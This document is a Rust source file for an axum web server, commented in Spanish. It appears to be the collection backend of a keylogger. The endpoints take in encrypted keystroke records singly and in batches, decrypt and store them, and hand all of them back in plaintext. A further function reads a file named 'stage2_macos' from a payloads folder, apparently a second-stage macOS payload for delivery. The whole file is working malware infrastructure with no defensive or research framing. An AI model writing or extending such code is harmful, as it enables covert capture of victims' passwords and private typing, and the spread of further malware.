// routes.rs
use axum::{
    extract::State,
    http::StatusCode,
    response::Json,
    routing::{get, post},
    Router,
};
use std::sync::Arc;
use crate::storage::Storage;
use crate::crypto;

pub fn create_routes(storage: Storage) -> Router {
    Router::new()
        .route("/keys", post(receive_key))
        .route("/keys/batch", post(receive_keys_batch))
        .route("/keys", get(get_keys))
        .with_state(Arc::new(storage))
}

// Recibir una tecla individual (CIFRADA)
pub async fn receive_key(
    State(storage): State<Arc<Storage>>,
    Json(payload): Json<serde_json::Value>,
) -> StatusCode {
    // 1. Extraer el dato cifrado
    let encrypted = payload["data"].as_str().unwrap_or("");
    if encrypted.is_empty() {
        eprintln!("⚠️ No se recibió dato cifrado");
        return StatusCode::BAD_REQUEST;
    }

    // 2. Descifrar
    let decrypted_str = match crypto::decrypt(encrypted) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("❌ Error descifrando: {}", e);
            return StatusCode::BAD_REQUEST;
        }
    };

    // 3. Parsear el JSON descifrado
    let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("❌ Error parseando JSON descifrado: {}", e);
            return StatusCode::BAD_REQUEST;
        }
    };

    // 4. Guardar en storage (ya descifrado)
    storage.add(data);
    StatusCode::CREATED
}

// Recibir múltiples teclas en un solo request (CIFRADAS)
pub async fn receive_keys_batch(
    State(storage): State<Arc<Storage>>,
    Json(payloads): Json<Vec<serde_json::Value>>,
) -> StatusCode {
    println!("📦 Recibiendo {} teclas cifradas en lote", payloads.len());

    for encrypted_payload in payloads {
        // 1. Extraer el dato cifrado
        let encrypted = encrypted_payload["data"].as_str().unwrap_or("");
        if encrypted.is_empty() {
            eprintln!("⚠️ Dato cifrado vacío en lote");
            continue;
        }

        // 2. Descifrar
        let decrypted_str = match crypto::decrypt(encrypted) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("❌ Error descifrando en lote: {}", e);
                continue;
            }
        };

        // 3. Parsear JSON descifrado
        let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("❌ Error parseando JSON descifrado en lote: {}", e);
                continue;
            }
        };

        // 4. Guardar
        storage.add(data);
    }

    StatusCode::CREATED
}

// Obtener todas las teclas (YA DESCIFRADAS)
pub async fn get_keys(
    State(storage): State<Arc<Storage>>,
) -> Json<Vec<serde_json::Value>> {
    Json(storage.get_all())
}

// Servir payload
pub async fn serve_payload() -> Vec<u8> {
    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
}
